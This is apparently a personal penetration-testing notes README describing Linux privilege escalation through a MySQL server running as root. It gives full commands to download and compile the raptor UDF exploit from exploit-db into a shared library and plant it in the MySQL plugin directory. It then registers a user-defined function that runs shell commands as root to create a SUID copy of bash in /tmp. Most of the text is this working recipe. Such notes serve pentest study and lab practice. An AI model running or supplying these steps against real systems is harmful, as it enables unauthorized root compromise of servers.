# Linux-Pentest
A repository to store some linux exploitation and technique i've seen during my studies

# List of contents:

## Linux Privesc:
### Privesc via mysql admin
If the mysql service is running as root we can use a popular exploit to execute commands:
We will use [Raptor exploit](https://www.exploit-db.com/exploits/1518) that we will compile on our local machine as follow.
```bash
curl https://www.exploit-db.com/download/1518 -o raptor.c
gcc -g -c raptor.c -fPIC
gcc -g -shared -Wl,-soname,raptor.so -o raptor.so raptor.o -lc
```
Once we have done that we can upload the raptor.so file to the victim machine (see file upload part).
To get an rce we need to run the following commands in mysql:
```bash
mysql -u root <pass> #if we have the password
```
Now in interactive shell:
```mysql
use mysql;
create table testing(line blob);
insert into testing values(load_file('/tmp/raptor.so'));
select * from testing into dumpfile '/usr/lib/mysql/plugin/raptor.so';
create function test_check returns integer soname 'raptor.so';
select test_check('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
By doing so we have created a copy of bash with the [SUID bit](https://www.computerhope.com/jargon/s/setuid.htm) set.
